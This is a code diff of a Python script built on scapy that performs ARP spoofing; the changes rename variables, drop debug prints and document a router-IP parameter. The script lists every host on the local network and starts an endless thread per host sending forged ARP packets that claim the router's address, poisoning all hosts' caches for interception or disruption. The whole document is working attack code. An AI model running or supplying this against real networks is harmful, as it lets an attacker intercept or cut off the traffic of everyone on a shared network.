@@ -18,24 +18,19 @@ from scapy.sendrecv import send
 def start_arp_spoof(router_ip='172.16.119.2'):
 	# get ip addresses of machines on local network
 	print("// ARP SPOOF ========================================")
-	# full_results = [re.findall('^[\w\?\.]+|(?<=\s)\([\d\.]+\)|(?<=at\s)[\w\:]+', i) for i in os.popen('ip n show')]
-	# final_results = [dict(zip(['IP', 'LAN_IP', 'MAC_ADDRESS'], i)) for i in full_results]
-	# print("final results: " + str(final_results))
-	# final_results = [{**i, **{'LAN_IP': i['LAN_IP'][1:-1]}} for i in final_results]
-	final_results = IP.neigh.show()
+	local_hosts = IP.neigh.show()
 
 	# loop through and poison ALL hosts
 	spoof = router_ip
 	op = 1  # Op code 1 for ARP requests
-	print("LOCAL IPS")
-	for host in final_results:
+	print("LOCAL HOSTS")
+	for host in local_hosts:
 		print("\t- " + str(host))
 		arp = ARP(op=op, psrc=spoof, pdst=str(host.address), hwdst=host.mac_address)
 		threading.Thread(target=do_arp_spoof, args=(arp,)).start()
 
 
 def do_arp_spoof(arp):
-	print("Sending: " + str(arp))
 	while True:
 		try:
 			send(arp)
@@ -45,7 +40,8 @@ def do_arp_spoof(arp):
 
 
 # MAIN ============================================= #
-
+# PARAM
+# -r        - Router IP address
 if __name__ == '__main__':
 	import optparse
 
